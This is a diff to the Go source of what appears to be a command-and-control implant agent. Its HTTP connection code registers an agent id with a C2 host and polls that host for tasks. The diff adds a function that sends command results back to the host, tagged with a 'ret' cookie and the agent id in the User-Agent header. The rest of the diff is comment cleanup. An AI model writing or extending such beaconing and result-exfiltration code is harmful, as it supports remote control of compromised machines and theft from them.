@@ -1,6 +1,7 @@
 package internal
 
 import (
+	"bytes"
 	"crypto/tls"
 	"net/http"
 	"net/url"
@@ -34,7 +35,7 @@ func NewHttpConn(c2Host string) (*HttpConn, error) {
 	}, nil
 }
 
-// HttpConn.SendRequest
+// SendRequest HttpConn.SendRequest
 // Send http request
 func (hc *HttpConn) SendRequest(req *http.Request) (*http.Response, error) {
 	resp, err := hc.client.Do(req)
@@ -44,7 +45,7 @@ func (hc *HttpConn) SendRequest(req *http.Request) (*http.Response, error) {
 	return resp, nil
 }
 
-// HttpConn.NewIdRequest
+// NewIdRequest HttpConn.NewIdRequest
 // Creates new agent id request object
 func (hc *HttpConn) NewIdRequest() (*http.Request, error) {
 	// Create request object
@@ -58,7 +59,7 @@ func (hc *HttpConn) NewIdRequest() (*http.Request, error) {
 	return req, nil
 }
 
-// Send a new task request
+// NewCmdRequest Send a new task request
 func (hc *HttpConn) NewCmdRequest() (*http.Request, error) {
 	req, err := http.NewRequest("GET", hc.host.String(), nil)
 	if err != nil {
@@ -70,8 +71,23 @@ func (hc *HttpConn) NewCmdRequest() (*http.Request, error) {
 	return nil, err
 }
 
-/*
-	We don't control system an agent is on, so its hard to verify the agent is actually ours
+func (hc *HttpConn) NewCmdResultRequest(data []byte) (*http.Request, error) {
+	// Put data in the request
+	body := bytes.NewReader(data)
 
-	Even w/ keys etc a reverse engineer can still reverse a auth method and hide their control
+	req, err := http.NewRequest("GET", hc.host.String(), body)
+	if err != nil {
+		return nil, err
+	}
+
+	req.Header.Set("Cookie", "ret")
+	req.Header.Set("User-Agent", hc.Id)
+
+	return req, nil
+}
+
+/*
+	We don't control system an agent is on, so it's hard to verify the agent is actually ours
+
+	Even w/ keys etc. a reverse engineer can still reverse a auth method and hide their control
 */
